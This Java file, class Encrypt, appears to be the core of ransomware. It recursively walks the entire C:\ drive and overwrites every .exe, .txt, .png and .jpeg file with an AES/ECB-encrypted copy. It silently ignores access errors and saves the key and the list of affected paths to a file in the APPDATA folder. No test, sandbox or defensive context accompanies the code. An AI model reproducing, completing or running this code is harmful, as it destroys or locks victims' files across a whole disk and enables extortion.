package kr.pah;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileWriter;
import java.nio.file.AccessDeniedException;
import java.nio.file.FileSystemException;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

public class Encrypt {

    private static final String KEY = UUID.randomUUID().toString().replaceAll("-", "").substring(0, 32);;
    private static final String[] EXTENSIONS = new String[]{".exe", ".txt", ".png", ".jpeg"};

    public static void runEncryption() throws Exception {
        List<String> encryptedFiles = new ArrayList<>();
        File root = new File("C:\\");

        encryptFilesInDirectory(root, encryptedFiles);

        // 암호화된 파일 경로 저장
        try (FileWriter writer = new FileWriter(System.getenv("APPDATA") + "\\encrypted.txt")) {
            writer.write(KEY);
            for (String filePath : encryptedFiles) {
                writer.write(filePath + System.lineSeparator());
            }
        }
    }

    private static void encryptFilesInDirectory(File directory, List<String> encryptedFiles) throws Exception {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    encryptFilesInDirectory(file, encryptedFiles);
                } else {
                    for (String extension : EXTENSIONS) {
                        if (file.getName().toLowerCase().endsWith(extension)) {
                            try {
                                encryptFile(file);
                                encryptedFiles.add(file.getAbsolutePath());
                            } catch (AccessDeniedException e) {
                            } catch (FileSystemException e) {
                            }
                            break;
                        }
                    }
                }
            }
        }
    }


    private static void encryptFile(File file) throws Exception {
        byte[] fileContent = Files.readAllBytes(file.toPath());
        byte[] encryptedContent = encrypt(fileContent);

        Files.write(file.toPath(), encryptedContent);
    }

    private static byte[] encrypt(byte[] data) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        SecretKeySpec secretKey = new SecretKeySpec(KEY.getBytes(), "AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        return cipher.doFinal(data);
    }
}
